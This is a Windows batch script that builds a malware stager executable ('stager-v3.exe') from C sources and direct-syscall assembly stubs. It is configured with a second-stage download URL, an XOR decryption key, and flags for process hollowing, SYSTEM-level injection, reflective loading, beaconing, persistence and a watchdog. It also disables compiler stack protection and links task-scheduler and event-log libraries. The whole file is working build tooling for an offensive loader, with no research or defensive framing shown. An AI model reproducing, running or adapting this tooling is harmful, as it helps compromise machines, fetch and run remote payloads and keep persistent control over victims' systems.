@echo off
setlocal EnableExtensions EnableDelayedExpansion

if not defined STAGE_SPAWN_MODE set "STAGE_SPAWN_MODE=1"
if not defined STAGE_VERBOSE set "STAGE_VERBOSE=0"
if not defined STAGE_PERSISTENCE set "STAGE_PERSISTENCE=0"
if not defined STAGE_PERSISTENCE_MODE set "STAGE_PERSISTENCE_MODE=%STAGE_PERSISTENCE%"
if not defined STAGE_WATCHDOG set "STAGE_WATCHDOG=0"
if not defined STAGE_KEEP_VERBOSE_LOG set "STAGE_KEEP_VERBOSE_LOG=0"
if not defined STAGE_SYSTEM_STRICT set "STAGE_SYSTEM_STRICT=1"
if not defined STAGE_SYSTEM_FALLBACK_TO_USER set "STAGE_SYSTEM_FALLBACK_TO_USER=0"
if not defined STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED set "STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED=1"
if not defined STAGE_ALLOW_DISK_STAGED_EXECUTION set "STAGE_ALLOW_DISK_STAGED_EXECUTION=0"
if not defined STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK set "STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK=0"
if not defined STAGE_BEACON_STATEFUL set "STAGE_BEACON_STATEFUL=0"
if not defined STAGE2_XOR_KEY set "STAGE2_XOR_KEY=%XOR_KEY%"

if "%STAGE_SPAWN_MODE%"=="system" (
    if not defined STAGE_SYSTEM_INJECTION set "STAGE_SYSTEM_INJECTION=1"
) else (
    if "%STAGE_SPAWN_MODE%"=="1" (
        set "STAGE_SYSTEM_INJECTION=1"
    ) else (
        set "STAGE_SYSTEM_INJECTION=0"
        set "STAGE_SYSTEM_STRICT=0"
        set "STAGE_SYSTEM_FALLBACK_TO_USER=0"
    )
)

if "%STAGE_PERSISTENCE%"=="1" (
    if "%STAGE_PERSISTENCE_MODE%"=="0" set "STAGE_PERSISTENCE_MODE=1"
) else (
    set "STAGE_PERSISTENCE_MODE=0"
)

if "%STAGE2_URL%"=="" (
    echo [ERROR] STAGE2_URL is required
    exit /b 1
)
if /I not "%STAGE2_URL:~0,7%"=="http://" if /I not "%STAGE2_URL:~0,8%"=="https://" (
    echo [ERROR] STAGE2_URL must start with http:// or https://
    exit /b 1
)
if "%STAGE2_XOR_KEY%"=="" (
    echo [ERROR] STAGE2_XOR_KEY is required
    exit /b 1
)
for /F "tokens=* delims=" %%K in ("%STAGE2_XOR_KEY%") do set "STAGE2_XOR_KEY=%%~K"
where powershell >nul 2>&1
if errorlevel 1 (
    echo [ERROR] PowerShell not available
    exit /b 1
)

powershell -NoProfile -Command "$k=\"%STAGE2_XOR_KEY%\"; if ($k -notmatch '^[0-9A-Fa-f]{32}$') { exit 1 }"
if errorlevel 1 (
    echo [ERROR] STAGE2_XOR_KEY must be 32 hex chars
    exit /b 1
)

set "SCRIPT_DIR=%~dp0"
set "INPUT_DIR=%SCRIPT_DIR%input"
set "OUTPUT_DIR=%SCRIPT_DIR%output"
if not exist "%INPUT_DIR%" mkdir "%INPUT_DIR%"
if not exist "%OUTPUT_DIR%" mkdir "%OUTPUT_DIR%"

set "VCVARS="
if exist "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat" set "VCVARS=C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"
if exist "C:\Program Files\Microsoft Visual Studio\18\Professional\VC\Auxiliary\Build\vcvars64.bat" if not defined VCVARS set "VCVARS=C:\Program Files\Microsoft Visual Studio\18\Professional\VC\Auxiliary\Build\vcvars64.bat"
if exist "C:\Program Files\Microsoft Visual Studio\18\BuildTools\VC\Auxiliary\Build\vcvars64.bat" if not defined VCVARS set "VCVARS=C:\Program Files\Microsoft Visual Studio\18\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
if exist "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat" if not defined VCVARS set "VCVARS=C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
if exist "C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars64.bat" if not defined VCVARS set "VCVARS=C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars64.bat"
if exist "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat" if not defined VCVARS set "VCVARS=C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
if exist "C:\Program Files\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat" if not defined VCVARS set "VCVARS=C:\Program Files\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat"
if exist "C:\Program Files\Microsoft Visual Studio\2019\Professional\VC\Auxiliary\Build\vcvars64.bat" if not defined VCVARS set "VCVARS=C:\Program Files\Microsoft Visual Studio\2019\Professional\VC\Auxiliary\Build\vcvars64.bat"
if exist "C:\Program Files\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvars64.bat" if not defined VCVARS set "VCVARS=C:\Program Files\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvars64.bat"

if not defined VCVARS (
    echo [ERROR] Could not find Visual Studio 2022/2019 vcvars64.bat path
    echo [ERROR] Checked 18/2022 Community/Professional/Enterprise and 2019 Community/Professional/BuildTools
    exit /b 1
)

call "%VCVARS%"
if errorlevel 1 (
    echo [ERROR] Failed to initialize Visual Studio environment
    exit /b 1
)

cd /d "%INPUT_DIR%" || exit /b 1

set "OUTPUT_FILE=%OUTPUT_DIR%\stager-v3.exe"
set "RUNTIME_CONFIG=%INPUT_DIR%\stager-runtime-config.h"
if exist "%RUNTIME_CONFIG%" del /f /q "%RUNTIME_CONFIG%" >nul 2>&1
(
  echo #ifndef STAGER_RUNTIME_CONFIG_H
  echo #define STAGER_RUNTIME_CONFIG_H
  echo #ifndef STAGE2_URL
  echo #define STAGE2_URL "%STAGE2_URL%"
  echo #endif
  echo #ifndef STAGE_PERSISTENCE
  echo #define STAGE_PERSISTENCE %STAGE_PERSISTENCE%
  echo #endif
  echo #ifndef STAGE_PERSISTENCE_MODE
  echo #define STAGE_PERSISTENCE_MODE %STAGE_PERSISTENCE_MODE%
  echo #endif
  echo #ifndef STAGE_WATCHDOG
  echo #define STAGE_WATCHDOG %STAGE_WATCHDOG%
  echo #endif
  echo #ifndef STAGE_SPAWN_MODE
  echo #define STAGE_SPAWN_MODE %STAGE_SPAWN_MODE%
  echo #endif
  echo #ifndef STAGE_SYSTEM_STRICT
  echo #define STAGE_SYSTEM_STRICT %STAGE_SYSTEM_STRICT%
  echo #endif
  echo #ifndef STAGE_ALLOW_DISK_STAGED_EXECUTION
  echo #define STAGE_ALLOW_DISK_STAGED_EXECUTION %STAGE_ALLOW_DISK_STAGED_EXECUTION%
  echo #endif
  echo #ifndef STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED
  echo #define STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED %STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED%
  echo #endif
  echo #ifndef STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK
  echo #define STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK %STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK%
  echo #endif
  echo #ifndef STAGE_BEACON_STATEFUL
  echo #define STAGE_BEACON_STATEFUL %STAGE_BEACON_STATEFUL%
  echo #endif
  echo #ifndef STAGE_SYSTEM_FALLBACK_TO_USER
  echo #define STAGE_SYSTEM_FALLBACK_TO_USER %STAGE_SYSTEM_FALLBACK_TO_USER%
  echo #endif
  echo #ifndef STAGE_SYSTEM_INJECTION
  echo #define STAGE_SYSTEM_INJECTION %STAGE_SYSTEM_INJECTION%
  echo #endif
  echo #ifndef STAGE2_XOR_KEY
  echo #define STAGE2_XOR_KEY "%STAGE2_XOR_KEY%"
  echo #endif
  echo #endif
) > "%RUNTIME_CONFIG%"

if not exist "windows-stager.c" (
    echo [ERROR] windows-stager.c not found in input directory
    exit /b 1
)
if not exist "syscalls-x64.asm" (
    echo [ERROR] syscalls-x64.asm not found in input directory
    exit /b 1
)

if exist "%OUTPUT_FILE%" del /f /q "%OUTPUT_FILE%" >nul 2>&1

echo [*] assembling syscall stubs
ml64 /c /Fo syscalls-x64.obj syscalls-x64.asm > "%OUTPUT_DIR%\build-asm.log" 2>&1
if errorlevel 1 (
    type "%OUTPUT_DIR%\build-asm.log"
    exit /b 1
)

echo [*] compiling C sources
cl /TP /c /O2 /Ob2 /Oi /Ot /GS- /DNDEBUG ^
  /DSTAGE_VERBOSE=%STAGE_VERBOSE% ^
  /DSTAGE_KEEP_VERBOSE_LOG=%STAGE_KEEP_VERBOSE_LOG% ^
  /DSTAGE_PERSISTENCE=%STAGE_PERSISTENCE% ^
  /DSTAGE_PERSISTENCE_MODE=%STAGE_PERSISTENCE_MODE% ^
  /DSTAGE_WATCHDOG=%STAGE_WATCHDOG% ^
  /DSTAGE_SPAWN_MODE=%STAGE_SPAWN_MODE% ^
  /DSTAGE_SYSTEM_INJECTION=%STAGE_SYSTEM_INJECTION% ^
  /DSTAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED=%STAGE_SYSTEM_PROCESS_HOLLOWING_ENABLED% ^
  /DSTAGE_ALLOW_DISK_STAGED_EXECUTION=%STAGE_ALLOW_DISK_STAGED_EXECUTION% ^
  /DSTAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK=%STAGE_SYSTEM_INPROCESS_REFLECTIVE_FALLBACK% ^
  /DSTAGE_BEACON_STATEFUL=%STAGE_BEACON_STATEFUL% ^
  /DSTAGE_SYSTEM_STANDALONE=0 ^
  /DSTAGE_SYSTEM_FALLBACK_TO_USER=%STAGE_SYSTEM_FALLBACK_TO_USER% ^
  /DSTAGE_SYSTEM_STRICT=%STAGE_SYSTEM_STRICT% ^
  /DSTAGE_USE_SYSCALLS=1 ^
  /FI stager-runtime-config.h ^
  windows-stager.c token_utils.c persistence.c watchdog.c > "%OUTPUT_DIR%\build-cl.log" 2>&1
if errorlevel 1 (
    echo [ERROR] C compilation failed
    type "%OUTPUT_DIR%\build-cl.log"
    exit /b 1
)

echo [*] linking
set "LINK_OBJECTS=windows-stager.obj token_utils.obj persistence.obj watchdog.obj syscalls-x64.obj"
link /OUT:"%OUTPUT_FILE%" /SUBSYSTEM:CONSOLE /MACHINE:X64 ^
  %LINK_OBJECTS% ntdll.lib kernel32.lib wininet.lib advapi32.lib ole32.lib oleaut32.lib wbemuuid.lib taskschd.lib wevtapi.lib comsuppw.lib > "%OUTPUT_DIR%\build-link.log" 2>&1
if errorlevel 1 (
    echo [ERROR] Link failed
    type "%OUTPUT_DIR%\build-link.log"
    exit /b 1
)

echo [+] Build complete: %OUTPUT_FILE%
del /f /q windows-stager.obj token_utils.obj persistence.obj watchdog.obj syscalls-x64.obj >nul 2>&1
exit /b 0
